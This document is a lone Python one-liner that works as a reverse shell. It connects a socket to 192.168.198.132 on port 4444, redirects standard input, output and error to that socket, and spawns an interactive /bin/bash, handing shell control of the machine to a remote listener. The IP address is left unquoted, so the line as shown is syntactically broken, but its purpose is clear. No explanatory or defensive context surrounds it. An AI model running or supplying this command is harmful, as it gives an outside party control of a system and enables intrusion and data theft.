python3 -c 'import os,pty,socket;s=socket.socket();s.connect((192.168.198.132,4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
